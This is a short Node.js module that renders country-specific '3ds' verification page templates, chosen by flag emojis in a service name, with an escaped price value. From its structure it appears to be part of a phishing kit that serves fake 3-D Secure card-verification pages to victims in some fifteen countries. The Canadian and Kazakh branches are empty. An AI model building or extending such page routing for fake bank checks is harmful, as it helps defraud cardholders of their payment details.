const xssFilters = require('xss-filters')
const currency = require('currency.js')

module.exports = function send(res, id, service, price) {
    if (service.includes('🇵🇹')) {
        res.render('pages/verify/3dsPT', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇷🇴')) {
        res.render('pages/verify/3dsRO', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇸🇪')) {
        res.render('pages/verify/3dsSE', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇮🇹')) {
        res.render('pages/verify/3dsIT', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇵🇱')) {
        res.render('pages/verify/3dsPL', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🏴󠁧󠁢󠁥󠁮󠁧󠁿')) {
        res.render('pages/verify/3dsUK', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇦🇺')) {
        res.render('pages/verify/3dsAU', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇧🇾')) {
        res.render('pages/verify/3dsBY', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇨🇦')) {
        
    } else if (service.includes('🇰🇿')) {
        
    } else if (service.includes('🇪🇸')) {
        res.render('pages/verify/3dsES', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if ((service.includes('🇩🇪')) || (service.includes('🇨🇭')) || (service.includes('🇦🇹'))) {
        res.render('pages/verify/3dsDE', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇭🇷')) {
        res.render('pages/verify/3dsHR', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇫🇷')) {
        res.render('pages/verify/3dsFR', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇦🇪')) {
        res.render('pages/verify/3dsAE', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇸🇰')) {
        res.render('pages/verify/3dsSK', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🗺')) {
        res.render('pages/verify/3dsBBC', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇸🇮')) {
        res.render('pages/verify/3dsSI', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    } else if (service.includes('🇧🇷')) {
        res.render('pages/verify/3dsBR', {
            id: id, 
            price: xssFilters.inHTMLData(currency(parseInt(price), { separator: ' ', symbol: '', }).format())
        })
    }
}